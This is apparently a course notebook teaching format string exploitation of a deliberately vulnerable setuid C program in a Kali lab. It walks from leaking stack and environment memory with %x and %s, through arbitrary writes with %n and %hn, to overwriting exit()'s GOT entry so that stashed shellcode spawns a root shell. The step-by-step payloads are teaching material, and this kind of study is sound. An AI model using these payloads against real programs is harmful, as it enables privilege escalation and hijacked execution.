# Format Strings
http://www.cplusplus.com/reference/cstdio/printf/?kw=printf

- `printf()` in C/C++ can be used to print fixed strings, variables in many different formats
- other cstring functions that uses format strings are: `fprintf`, `sprintf`, `scanf`, `fscanf`, `sscanf`
- hello.cpp program below uses `printf()` incorrectly!
- "Good Bye World!\n" string technically is the format string (devoid of special escape sequences called format parameters)
- format parameters begins with a `%` sign; for each format parameter (%) function expects arguments
- format specifier follows this prototype:
`%[flags][width][.precision][length]specifier`

- following parameter requires values/variables as arguments

| Parameter | Output Type |
| --- | --- |
| %d | Decimal |
| %u | Unsigned decimal |
| %x | Hexadecimal |

- the following parameters expect pointers/addresses as arguments

| Parameter | Output Type |
| --- | --- |
| %s | String |
| %n | Number of bytes written so far |
| %p | Memory address |

- `%s` - reads the data pointed to by the address/pointer provided as an argument
- `%n` is intriguing parameter as it expectes integer address and writes number of bytes written so far to starndard output to that address!
    - what could potentially go wrong here?!!...

- `%s` and `%n` are the focus of this notebook


```python
%pwd
```


```python
%cd ../demos
```


```python
%cat hello.cpp
```


```python
! g++ -m32 -std=c++20 -o hello.exe hello.cpp
```


```python
! ./hello.exe
```

## Format Parameters Examples
- let's look into fmt_strings.cpp program to see common usage of format strings and parameters


```python
%cd fmt_strings
```


```python
! cat fmt_strings.cpp
```


```python
! g++ -m32 -o fmt_strings.exe fmt_strings.cpp
```


```python
! g++ -m32 -Wall -o fmt_strings.exe fmt_strings.cpp
```


```python
! cp ../../demos/compile.sh .
```


```bash
%%bash
input="fmt_strings.cpp"
output=fmt_strings.exe
echo kali | sudo -S ./compile.sh $input $output
```


```python
# note high value for A: -ve value is stored using two's complement
! ./fmt_strings.exe
```

## Format Parameter `%n`

- `%n` - uncommon, but let's understand how it works
- `%n` - takes pointer argument; writes the number of bytes written so far to the corresponding variable's address


```python
cat fmt_uncommon.cpp
```


```bash
%%bash
input="fmt_uncommon.cpp"
output=fmt_uncommon.exe
echo kali | sudo -S ./compile.sh $input $output
```


```python
! ./fmt_uncommon.exe
```

### Stack frame of printf( )
- let's look at the stack frame of `printf()` right after it is called in fmt_uncommon.cpp
- look at the last printf()

#### printf("A is %d and is at %08x.  B is %x.\n", A, &A, B);
- hint: arguments are pushed in reverse order (last argument first)


|Top of the stack (lower address)|
| :----: |
| local variable |
| EBP of main |
| return address to main |
| Address of format string (first argument)|
| Value of A |
| Address of A |
| Value of B |
| ... |
| Stack frame of main |
| Bottom of the Stack (higher address) |

### what if?
- what happens if fewer arguments are passed to printf()?
    - what kind of error happens: syntax error? logical error? run-time error?
- e.g,: `printf("A is %d and is at %08x. B is %x.\n", A, &A);`
- what if no arguments are provided to format parameters of the printf() 
    - no argument is provided to the last parameter `%x` parameter, e.g.
- fmt_uncommon2.cpp provided in demos/fmt_strings/fmt_uncommon2.cpp demonstrates just this
- fmt_uncommon2.cpp is essentially same as fmt_uncommon.cpp file except in one line


```python
# see the difference between the fmt_uncommon.cpp and fmt_uncommon2.cpp
! diff fmt_uncommon.cpp fmt_uncommon2.cpp
```


```bash
%%bash
# let's compile the fmt_uncommon2.cpp file
input=fmt_uncommon2.cpp
output=fmt_uncommon2.exe

echo kali | sudo -S ./compile.sh $input $output
```


```python
# execute the program
! ./fmt_uncommon2.exe
```

### Note the value of B
- Is that the correct value of B? So, what happend?
- since there's no corresponding argument for third `%x`, it pulled some value stored in the location where the third argument was supposed to be on the stack
- this is the value found below the stack frame of the printf function
- as a result, program read data from memory that it's not supposed to
    - violation of confidentialy and integrity of the data/program

## The Format String Vulnerability
- if string variable is printed directly `printf(c_string)` instead of `printf("%s", c_string)`
    - if the value of string variable can't be trusted; usually user provided or received externally from another program, network, file, etc.
- let's demonstrate the format string vulnerability using `fmt_vuln.cpp` program in `demos/fmt_strings/vuln1/` folder


```python
! pwd
```


```python
# change working directoroy to vuln1 folder
%cd fmt_strings/vuln1
```


```python
! pwd
```


```python
! ls -al
```


```python
! cat fmt_vuln.cpp
```


```python
# let's compile the file using the provided Makefile
! echo kali | sudo -S make
```


```python
# make sure ownership is changed to root and SETEUID is set
! ls -al fmt_vuln.exe
```


```python
# run fmt_vuln.exe
! ./fmt_vuln.exe
```


```python
! ./fmt_vuln.exe "testing 124 abc #\$$556"
# Note $ has special meaning to printf() function; you'll see the usage below
```


```python
# what if you provide %s as value
! ./fmt_vuln.exe "testing%s"
# notice the repeating of the argument itself!
```

## Control the Input String
- we see `%s` provided in the input string prints itself
- if `%s` is forced to print string from arbitrary address, you'll crash the program!


```python
# let's see what %x prints!
! ./fmt_vuln.exe "AAAA%x"
```


```python
# when program crashes, the vulnerable printf() function 
# chokes and doesn't print anything
! ./fmt_vuln.exe "AAAA%s"
```


```python
# let's check if it crashes now
! ./fmt_vuln.exe "AAAA%s%s%s"
```


```python
# let's check if it crashes now
! ./fmt_vuln.exe "AAAA%s%s%s%s"
```


```python
# you can seed things up...
! ./fmt_vuln.exe $(python -c 'print("AAAA%s."*50)')
# the rest of the output is not printed due to run-time exception
```

### Let's Use %x Parameter
- recall, `%x` parameter formats the argument in Hex
- what if you provide `%x` as part of data?


```python
! ./fmt_vuln.exe AAAA%x%x%x%x%x
# note the address of text...
```


```python
# process can be reapeated to examine stack memory below at the higher addresses
# just provide a lot of format parameter as hex and see what's on stack
! ./fmt_vuln.exe $(python -c 'print("AAAA" + "%08x."*40, end="")')
# Note: as more data is passed to the program, text address shifts
```


```python
# notice a bunch of 2e78383025 are repeated
# each four bytes values are reversed due to little-endian architecture
! python -c 'print("\x25\x30\x38\x78\x2e")'
```


```python
# try to print the same output as string
! ./fmt_vuln.exe $(python -c 'print("%s."*40)')
# the program crashes...
```

## Read from Arbitrary Memory Address
- `%s` format parameter can be used to read from arbitrary memory addresses
- part of the format string can be used to supply controlled address to the `%s` format parameter
- if a valid memory address is used, this process could be used to read a string found at that memory address

### Environment variables are loaded into each program's memory

- we'll use demos/stack_overflow/getenvaddr.cpp to get address of an env variable
- use the PATH variable's address as an argument for `%s`
    - essentially force the program to print the value of PATH variable
    
```bash
$ ./fmt_vuln.exe $(print "\x address in reverse bytes")%08x-%08x-%08x-%s
```


```python
# provide a bunch of %08x as a part of string to see where the first string repeats
! ./fmt_vuln.exe AAAABBBB-%08x-%08x-%08x-%08x-%08x
# notice that fourth parameter is repeating from begnning of the format string 
# AAAA is 4th parameter
```


```python
# try printing the AAAA as %s
! ./fmt_vuln.exe AAAA%08x-%08x-%08x-%x
```

- why do we get segfault?
- it's attempting to print string at the address AAAA 
- recall `%s` needs address of c-string parameter
- how about we provide some valid memory address instead of AAAA?


```python
! env | grep $PATH
```

    PATH=/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games



```python
! pwd
```


```python
# let's copy getenvaddr.cpp file from demos/... into the current folder
! cp ../../stack_overflow/getenvaddr.cpp .
```


```python
! ls -al
```


```python
# compile and run getevnaddr.cpp to find the memory 
# address of env variables wrt  programs
! cat getenvaddr.cpp
```


```bash
%%bash
input="getenvaddr.cpp"
output="getenvaddr.exe"
g++ -m32 -o $output $input
```


```python
# find address of PATH variable wrt fmt_vuln.exe
! ./getenvaddr.exe PATH ./fmt_vuln.exe
```

    PATH will be at 0xffffc260 with reference to ./fmt_vuln.exe



```python
# let's try to read the value of PATH using fmt_vuln.exe
! ./fmt_vuln.exe $(printf "\x60\xc2\xff\xff")%08x-%08x-%08x-%s
```

    The right way to print user-controlled input:
    `���%08x-%08x-%08x-%s
    
    The wrong way to print user-controlled input:
    `���ffffb900-00000000-080491b0-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb900



```python
# you can use python or pwntools to change the byte order
# so you don't have to write in reverse oder in hex format
! python -c 'import sys; sys.stdout.buffer.write((0xffffc260).to_bytes(4, byteorder="little"))'
```

    `���


```python
# let's try to read the value of PATH using fmt_vuln.exe using python
! ./fmt_vuln.exe $(python -c 'import sys; sys.stdout.buffer.write((0xffffc260).to_bytes(4, byteorder="little"))')%08x-%08x-%08x-%s
```

    The right way to print user-controlled input:
    `���%08x-%08x-%08x-%s
    
    The wrong way to print user-controlled input:
    `���ffffb900-00000000-080491b0-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb900



```python
! pip install -U pwntools
```


```python
# let's try to read the value of PATH using fmt_vuln.exe using python
! ./fmt_vuln.exe $(python -c 'import sys; from pwn import p32; sys.stdout.buffer.write(p32(0xffffc260))')%08x-%08x-%08x-%s
```

    The right way to print user-controlled input:
    `���%08x-%08x-%08x-%s
    
    The wrong way to print user-controlled input:
    `���ffffb900-00000000-080491b0-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb900


### Notice if part of variable name PATH= is missing from the value /home/user/...
- we overshot the address by 5 bytes
- we can stubtract (# of missing characters); essentially reducing the PATH address by 5 bytes


```python
# can subtract from the complete address
! printf "%x" $((0xffffc260-5))
```

    ffffc25b


```python
# or just substract from the leaset significant byte
# using Python
print(f"{0x60-5:x}")
```

    5b



```python
! ./fmt_vuln.exe $(python -c 'import sys; sys.stdout.buffer.write((0xffffc25b).to_bytes(4, byteorder="little"))')%08x-%08x-%08x-%s
# now we see our complete path
```

    The right way to print user-controlled input:
    [���%08x-%08x-%08x-%s
    
    The wrong way to print user-controlled input:
    [���ffffb900-00000000-080491b0-PATH=/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb900


## Write to Arbitrary Memory Address

- Recall that:
    - `%s` - can be used to read as string pointed to by an memory address
    - `%x` - can be used to read an memory address as Hex
    - `%n` - can be used to write (integer value) to memory address

- note that `test_val` variable has been printing its address and value in the debug statement
- what if we provide the address of test_val for our `%n` parameter?

```bash
$ fmt_vuln.exe $(printf "\x reverse address of test_val")-%08x-%08x-%08x-%n
```

- however, the resulting value in the `test_val` variable depends on the number of bytes written before the `%n`
- this can be controlled to a a greater degree by manipulating the field **WIDTH** option so we don't have to print a larger number of actual characters to write something more meaningful such as memory address to `test_val`

```bash
$ fmt_vuln.exe $(printf "\x reverse address of test_val")-%x-%x-%x-%n
$ fmt_vuln.exe $(printf "\x reverse address of test_val")-%x-%x-%100x-%n
$ fmt_vuln.exe $(printf "\x reverse address of test_val")-%x-%x-%400x-%n
```


```python
# let's note the address of test_val
! ./fmt_vuln.exe AAAA%x%x%x%x
```

    The right way to print user-controlled input:
    AAAA%x%x%x%x
    
    The wrong way to print user-controlled input:
    AAAAffffb910080491b041414141
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb910



```python
# use the address of test_val to write to for %n parameter
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")-%08x-%08x-%08x-%n
# Note test_val: which is the total bytes written thus far by printf()
```

    The right way to print user-controlled input:
    �-%08x-%08x-%08x-%n
    
    The wrong way to print user-controlled input:
    �-ffffb900-00000000-080491b0-
    
    [*] test_val @ 0x0804c01c = 32 0x00000020
    [*] text is @ 0xffffb900



```python
# value can be controlled by manipulating the field width of arguments before it
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")-%x-%x-%x-%n
```

    The right way to print user-controlled input:
    �-%x-%x-%x-%n
    
    The wrong way to print user-controlled input:
    �-ffffb910-0-80491b0-
    
    [*] test_val @ 0x0804c01c = 24 0x00000018
    [*] text is @ 0xffffb910



```python
# value can be controlled by manipulating the field width of arguments before it
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")-%x-%x-%100x-%n
```

    The right way to print user-controlled input:
    �-%x-%x-%100x-%n
    
    The wrong way to print user-controlled input:
    �-ffffb900-0-                                                                                             80491b0-
    
    [*] test_val @ 0x0804c01c = 117 0x00000075
    [*] text is @ 0xffffb900



```python
# value can be controlled by manipulating the field width of arguments before it
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")-%x-%284x-%400x-%n
```

    The right way to print user-controlled input:
    �-%x-%284x-%400x-%n
    
    The wrong way to print user-controlled input:
    �-ffffb900-                                                                                                                                                                                                                                                                                           0-                                                                                                                                                                                                                                                                                                                                                                                                         80491b0-
    
    [*] test_val @ 0x0804c01c = 700 0x000002bc
    [*] text is @ 0xffffb900


## Write User-Controlled Values (0xaddress)

- the above trick (manipulating width) works for small numbers but won't work for large ones like memory addresses
- let's write 0xDDCCBBAA to variable `test_val`; let's say the test_val which is at 0x0804c01c` 

- 0xAA goes to least significant byte, 0xBB to next byte and so on and 0xDD goes to the most significant byte
- $ 0xAA \rightarrow 1^{st} byte$
- $ 0xBB \rightarrow 2^{nd} byte$
- $ 0xCC \rightarrow 3^{rd} byte$
- $ 0xDD \rightarrow 4^{th} byte$

| Memory address | Value |
| --- | --- |
| 0x0804c01c | AA |
| 0x0804c01d | BB |
| 0x0804c01e | CC |
| 0x0804c01f | DD |


```python
# find out the width value to print 0xaa in the right location
# 8 is used to standarize the output (8 hex characters, 4 bytes); 
# less than 8 is not enough width and is ignored by printf() 
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")-%x-%x-%8x-%n
```

    The right way to print user-controlled input:
    �-%x-%x-%8x-%n
    
    The wrong way to print user-controlled input:
    �-ffffb900-0- 80491b0-
    
    [*] test_val @ 0x0804c01c = 25 0x00000019
    [*] text is @ 0xffffb900



```python
# 0xaa is the goal; 25 is what 8 width provides
! printf "%d" $(( 0xaa-25 + 8))
```

    137


```python
# or use python
print(0xaa-25+8)
```

    153



```python
# replace width 8 with the resulting value
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")-%x-%x-%153x-%n
# test_val = 0x000000aa
# we've aa least significant byte in right the place
```

    The right way to print user-controlled input:
    �-%x-%x-%153x-%n
    
    The wrong way to print user-controlled input:
    �-ffffb900-0-                                                                                                                                                  80491b0-
    
    [*] test_val @ 0x0804c01c = 170 0x000000aa
    [*] text is @ 0xffffb900


#### Writing to rest of the bytes (3-bytes) memory address

- if we write all 4-btyes memory locations next to each other, we can't control the value to be written at that location
- we need to add some text (4-bytes JUNK) separator to our input payload that can help us provide the width to control what value to print to the next byte location
- our final payload will have the following structure:

```
[Add 0th]JUNK[Add 1st]JUNK[Add 2nd]JUNK[Add 3rd]-%x-%x-%[W]x%n%[W]x%n%[W]x%n%[W]x%n
```
- e.g., wan't to write 4 bytes beginning at the memory address `0x... 1c`, we'd try to do the following:

| Memory address | format specifier | Final Value |
| --- | --- | -- |
| memory | %[w]x | hex |
| 0x...1c | %n | AA |
| JUNK | %[w]x | hex |
| 0x...1d | %n | BB |
| JUNK | %[w]x | hex |
| 0x...1e | %n | CC |
| JUNK | %[w]x | hex |
| 0x...1f | %n | DD |


```python
# next write 0xbb, 0xcc, and 0xdd
# need 3 more %x%n format to write to each byte of addresses
# since %x needs some 4 bytes to write, we can provide anything such as JUNK
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08JUNK\x1d\xc0\x04\x08JUNK\x1e\xc0\x04\x08JUNK\x1f\xc0\x04\x08")-%x-%x-%8x%n
```


```python
# find the width to be used so the final value is 0xaa
! echo $(( 0xaa-55+8 ))
```


```python
# replace width 8 width with the result to write 0xaa
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08JUNK\x1d\xc0\x04\x08JUNK\x1e\xc0\x04\x08JUNK\x1f\xc0\x04\x08")-%x-%x-%123x%n
```


```python
# next need to write 0xbb in 2nd byte
print(0xbb - 0xaa)
```


```python
# now write 0xbb in correct address
# add %17x%n or -%16x%n
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08JUNK\x1d\xc0\x04\x08JUNK\x1e\xc0\x04\x08JUNK\x1f\xc0\x04\x08")-%x-%x-%123x%n-%16x%n
```


```python
print(0xcc - 0xbb)
```


```python
# now write 0xcc in correct address
# add %17x%n or -16x
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08JUNK\x1d\xc0\x04\x08JUNK\x1e\xc0\x04\x08JUNK\x1f\xc0\x04\x08")-%x-%x-%123x%n-%16x%n-%16x%n
```


```python
# finally write 0xdd
print(0xdd - 0xcc)
```


```python
# now write 0xdd in correct address
# add %17x%n or -%16x%n
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08JUNK\x1d\xc0\x04\x08JUNK\x1e\xc0\x04\x08JUNK\x1f\xc0\x04\x08")-%x-%x-%123x%n-%16x%n-%16x%n-%16x%n
# note JUNK can be anything
```

## Use Direct Parameter Access

- we can use `%N$<format>` to directly access argument
    - N is the position of argument starting at 1
- simplified way to exploit format string vulnerability
- allows parameters to be accessed directly by using argument order # (starting from 1) and the the dollar sign qualifier
    - `%1$d` - access the $1^{st}$ parameter and display it as a decimal number
    - `%2$x` - access the $2^{nd}$ parameter and display it as as a hexadecimal number
- instead of sequentially accessing the first three parameters and using 4 bytes spacers of JUNK to increment the byte output count, we can use direct parameter access
- let's write a more realistic-looking address of **0xbffffd72** into the variable test_val in fmt_vuln program
- let's see how direct parameter access works using `demos/fmt_strings/fmt_directpara.cpp` program


```python
!pwd
```

    /home/kali/projects/SoftwareSecurity/demos/fmt_strings/vuln1



```python
! ls -al ../
```

    total 152
    drwxr-xr-x  3 kali kali  4096 Apr 25 15:16 .
    drwxr-xr-x 25 kali kali  4096 Apr 25 14:21 ..
    -rwxr-xr-x  1 kali kali   826 Apr 25 14:21 compile.sh
    -rw-r--r--  1 kali kali   121 May  3  2024 fmt_directpara.cpp
    -rw-r--r--  1 kali kali   762 May  3  2024 fmt_strings.cpp
    -rwxr-xr-x  1 root root 71952 Apr 25 14:21 fmt_strings.exe
    -rw-r--r--  1 kali kali   496 May  3  2024 fmt_uncommon2.cpp
    -rwxr-xr-x  1 root root 20604 Apr 25 15:16 fmt_uncommon2.exe
    -rw-r--r--  1 kali kali   499 May  3  2024 fmt_uncommon.cpp
    -rwxr-xr-x  1 root root 20600 Apr 25 14:21 fmt_uncommon.exe
    drwxr-xr-x  2 kali kali  4096 Apr 28 15:25 vuln1



```bash
%%bash
input="../fmt_directpara.cpp"
output="directpara.exe"
g++ -m32 -o $output $input
```


```python
! ./directpara.exe
```


```python
# without direct access
! ./fmt_vuln.exe AAAA%x%x%x%x
# 4th parameter is where AAAA repeats; if not sure, try one at a time by adding %x
```


```python
# access the fourth argument (from beginning of the format string printf(...))
# $ sign is special character for bash so must be escaped
! ./fmt_vuln.exe AAAA%4\$x
# can try 1 at a time from 1...n until you see AAAA printed in hex
```

    The right way to print user-controlled input:
    AAAA%4$x
    
    The wrong way to print user-controlled input:
    AAAA41414141
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb910



```python
# we can access the rest of the payload the same way...
! ./fmt_vuln.exe AAAABBBB%4\$x%5\$x
```

    The right way to print user-controlled input:
    AAAABBBBCCCCCDDDD%4$x%5$x
    
    The wrong way to print user-controlled input:
    AAAABBBBCCCCCDDDD4141414142424242
    
    [*] test_val @ 0x0804c01c = -72 0xffffffb8
    [*] text is @ 0xffffb900



```python
# similarly, access 4 memory locations
```


```python
# use the same technique to write to the 4th argument as address
! ./fmt_vuln.exe $(printf "AAAA")%4\$s
# get seg fault - because AAAA is not a valid address
```

    The right way to print user-controlled input:
    AAAA%4$s
    
    The wrong way to print user-controlled input:



```python
# no segfault if 4th argument was a valid memory address
# let's provide test_val's adddress
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")%4\$n
```


```python
# no need of JUNK; just use direct parameter access to write the rest in each memory byte
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08")%4\$n
```


```python
# let's write our controlled address: 0xbffffd72 to test_val
# let's do some math to get 0x72
print(0x72-16)
```

    98



```python
# use the result as width to get 0x72 as least significant value for our controlled address: 0xbffffd72
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08")%98x%4\$n
```


```python
# do some math to print 0xfd of our controlled address: 0xbffffd72
print(0xfd-0x72)
```


```python
# use 139 as width to get 0xfd as next value
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08")%98x%4\$n%139x%5\$n
```


```python
# do some math to print 0xff of our controlled address: 0xbffffd72
print(0xff-0xfd)
```


```python
# width of 2 doesn't work; shorter than (4 bytes or 8 characters hex) memory address!
# add 1 in the front to make 0xff a bigger number to get larger than 8 width
print(0x1ff-0xfd)
```


```python
# use 2 as width to get 0xff as next value
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08")%98x%4\$n%139x%5\$n%258x%6\$n
```


```python
# do some math to print 0xbf of our controlled address: 0xbffffd72
print(0xbf-0xff)
```


```python
# negative width will not work!, make 0xbf larger by prepending 1
print(0x1bf-0xff)
```


```python
# use 2 as width to get 0xff as next value
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08")%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
```

## Using Short (2-byte) Writes
- a `short` is typically a two-byte word using `h`
- helps write an entire four-byte value with just two `%hn` parameters, instead of 4!
- let's overwrite test_val variable with the address `0xbffffd72`

| Address | Value |
| --- | --- |
| 0x0804c01c | 0xfd72 |
|0x0804c01e | 0xbfff |


```python
# update least significant byte
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")%x%x%x%n
```


```python
# notice the test_val in hex: updates on both ends of the 4 bytes
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")%x%x%x%hn
```


```python
# short write can be used with direct parameter access
# update two least significant bytes
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08")%4\$hn
```


```python
# lets write 0xbffffd72 to test_val
#  ./fmt_vuln.exe $(printf "[first byte address][3rd byte address]")%[w]x%4\$hn%[w]x%5\$hn
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%x%4\$hn
```


```python
# 0xfd72 is written in first two (lower) bytes
# Since 8 bytes of memory addresses will be written, subtract it from the goal

print(0xfd72-8)
```


```python
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%64874x%4\$hn
```


```python
# 0xbfff is written in last two (higher bytes)
print(0xbfff-0xfd72)
```


```python
# if smaller than previous width so, prepend 1
print(0x1bfff-0xfd72)
```


```python
# finally write 0xbffffd72 to test_val using 4th and 5th parameters
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%64874x%4\$hn%49805x%5\$hn
```

## Control the execution flow of the program
- overwrite the return address in the most recent stack frame
- stack-based overflow only allows overwriting return address
- however, format string vulnerability provides the ability to overwrite any memory address the program can access


## Overwriting the Global Offset Table
- See this [stackoverflow question to learn got and plt](https://stackoverflow.com/questions/43048932/why-does-the-plt-exist-in-addition-to-the-got-instead-of-just-using-the-got#:~:text=The%20PLT%20entry%20for%20a,first%20call%20(lazy%20binding).)
- PLT (procedure linkage table) is used to store shared library
- each time a shared function needs to be called, control will pass through the PLT
- objdump program can be used to see `.plt` section
- consists of many jump instructions each one corresponding to the address of a function
    - run the cell below to see .plt section in fmt_vuln.exe program
- `exit()` is called at the end of the program
- if `exit()` function can be manipulated to direct the execution flow into shellcode, a root shell will be spawned
- most of the functions are not jumping to addresses but to pointers to addresses
    - e.g., exit() function's address is stored at `jump *[address]` (see below)
- these addresses exist in another section, called the Global Offset Table (GOT) which is writable


```python
! objdump -d -j .plt ./fmt_vuln.exe
```

    
    ./fmt_vuln.exe:     file format elf32-i386
    
    
    Disassembly of section .plt:
    
    08049020 <__libc_start_main@plt-0x10>:
     8049020:	ff 35 f8 bf 04 08    	push   0x804bff8
     8049026:	ff 25 fc bf 04 08    	jmp    *0x804bffc
     804902c:	00 00                	add    %al,(%eax)
    	...
    
    08049030 <__libc_start_main@plt>:
     8049030:	ff 25 00 c0 04 08    	jmp    *0x804c000
     8049036:	68 00 00 00 00       	push   $0x0
     804903b:	e9 e0 ff ff ff       	jmp    8049020 <_init+0x20>
    
    08049040 <printf@plt>:
     8049040:	ff 25 04 c0 04 08    	jmp    *0x804c004
     8049046:	68 08 00 00 00       	push   $0x8
     804904b:	e9 d0 ff ff ff       	jmp    8049020 <_init+0x20>
    
    08049050 <strcpy@plt>:
     8049050:	ff 25 08 c0 04 08    	jmp    *0x804c008
     8049056:	68 10 00 00 00       	push   $0x10
     804905b:	e9 c0 ff ff ff       	jmp    8049020 <_init+0x20>
    
    08049060 <puts@plt>:
     8049060:	ff 25 0c c0 04 08    	jmp    *0x804c00c
     8049066:	68 18 00 00 00       	push   $0x18
     804906b:	e9 b0 ff ff ff       	jmp    8049020 <_init+0x20>
    
    08049070 <exit@plt>:
     8049070:	ff 25 10 c0 04 08    	jmp    *0x804c010
     8049076:	68 20 00 00 00       	push   $0x20
     804907b:	e9 a0 ff ff ff       	jmp    8049020 <_init+0x20>



```python
# see .got section header and if it says DATA -- means WRITEABLE.
! objdump -h ./fmt_vuln.exe
```


```python
# display all dynamic relocations; short cut to see th pointers to the library functions
! objdump -R ./fmt_vuln.exe
```

- NOTE: exit()'s GOT entry OFFSET - which can be overwritten with the address of smuggled shellcode

## Smuggle Shellcode & Exploit
- create shellcode using gdb-peda - see [GDB-Peda.ipynb](./GDB-Peda.ipynb) Notebook for details
    - use printf bash command to write 'shellcode as a binary file' > shellcode.bin
    - or use shellcode_writer.py script to create binary shellcode
- export shllcode as an env variable
- find and write the address of shellcode into the address of the exit() function
- when the program exits, it actually executes the shellcode in env variable

### steps
- stash the shellcode in env variable
- find the address of the shellcode when the vulnerable program is loaded
- find shared library function in GOT that's executed by the vulnerable program
- by exploiting format string vulnerability, write the shellcode's address to the shared function's jump address
- put it all together as a exploit code and launch it to exploit the vulnerable program

### Advantage of using GOT
- GOT entries are fixed per binary
    - different system with the same binary will have the same GOT entry at the same address
- ability to overwrite any arbitrary address opens up many possiblilites for exploitation
- any section of writable memory that contains an address that directs the flow of program execution can be targeted
- copy `shellcode_root.bin` file from `demos/shellcodes` folder


```python
! pwd
```

    /home/kali/projects/SoftwareSecurity/demos/fmt_strings/vuln1



```python
! cp ../../shellcodes/shellcode_root.bin .
```


```python
! ls -al shellcode_root.bin
```

    -rw-r--r-- 1 kali kali 35 Apr 30 14:09 shellcode_root.bin


### Use terminal to complete the following steps
- create SHELLCODE env variable

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]
└─$ export SHELLCODE=$(cat ./shellcode_root.bin)

```
- get the address of SHELLCODE env variable when ./fmt_vuln.exe program is executing

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]
└─$ ./getenvaddr.exe SHELLCODE ./fmt_vuln.exe   
SHELLCODE will be at 0xffffcc0b with reference to ./fmt_vuln.exe

```

- now that we know the address of shellcode, let's find out how we can write this address

### Create exploit code and test it to make sure you're writing the correct address


```python
# try 1, 2, 3, 4, etc, until you see hex A's printed
# we know, 4th parameter starts printing AAAA for fmt_vuln.exe
! ./fmt_vuln.exe $(printf "AAAA")%4\$x
```


```python
# let's write the SHELLCODE address to test_val to make sure we can do it
# we can do the calculations to write to exit function's location in GOT
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%4\$hn
```


```python
# find the first width; # SHELLCODE will be at 0xffffcc0b
# 8 bytes of addresses will be printed
print(0xcc0b-8)
```


```python
# find the 2nd width; # SHELLCODE will be at 0xffffcc0b
print(0xffff-0xcc0b)
```


```python
# let's write SHELLCODE's address to test_val for quick testing
! ./fmt_vuln.exe $(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%52227x%4\$hn%13300x%5\$hn
```


```python
# find the exit function's address in GOT and write SHELLCODE address to it
! objdump -R ./fmt_vuln.exe | grep exit
```


```python
# find the location of 2nd two bytes of exit function
print(hex(0x10+2))
```


```python
# Simply replace test_val's address with exit() address in the same order
! ./fmt_vuln.exe $(printf "\x10\xc0\x04\x08\x12\xc0\x04\x08")%52227x%4\$hn%13300x%5\$hn
```

### Finally, run the crafted command from a Terminal
- the vulnerable program should execute the stashed shellcode
- you should see a root prompt that you can interact with

```bash
...
...

[*] test_val @ 0x0804c028 = -72 0xffffffb8
[*] text is @ 0xffffbed0
# whoami
root
# cls
/bin//sh: 2: cls: not found
# clear
TERM environment variable not set.
# ls
Makefile  directpara.exe  fmt_vuln.cpp  fmt_vuln.exe  fmt_vuln.o  getenvaddr.cpp  getenvaddr.exe  shellcode_root.bin
# 
```

## Smuggle shellcode into the text buffer
- instead of stashing the Shellcode in environment variable, send it to the program and make the program execute it by overwriting the exit() function in GOT

### Steps
1. create a string in this format: `| NOP Sled | Shellcode |`
2. Find the address of text buffer
3. Find the address of `exit( )`
4. Overwrite the address of exit with the address of text buffer
